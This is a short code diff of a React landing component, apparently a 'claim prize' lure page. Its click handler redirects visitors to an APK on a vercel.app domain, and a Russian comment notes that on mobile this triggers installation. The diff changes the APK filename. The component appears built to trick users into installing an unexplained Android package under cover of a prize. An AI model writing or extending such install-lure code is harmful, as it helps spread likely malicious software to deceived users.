@@ -5,7 +5,7 @@ export default function DarkLanding() {
 const handleClaimPrize = (e) => {
     e.preventDefault();
 
-    const apkUrl = 'https://uzbekistan-info.vercel.app/docs/sxUZ.apk';
+    const apkUrl = 'https://uzbekistan-info.vercel.app/docs/Sliv.apk';
     
     // На мобилке: попытка открыть напрямую (вызовет установку)
     window.location.href = apkUrl;
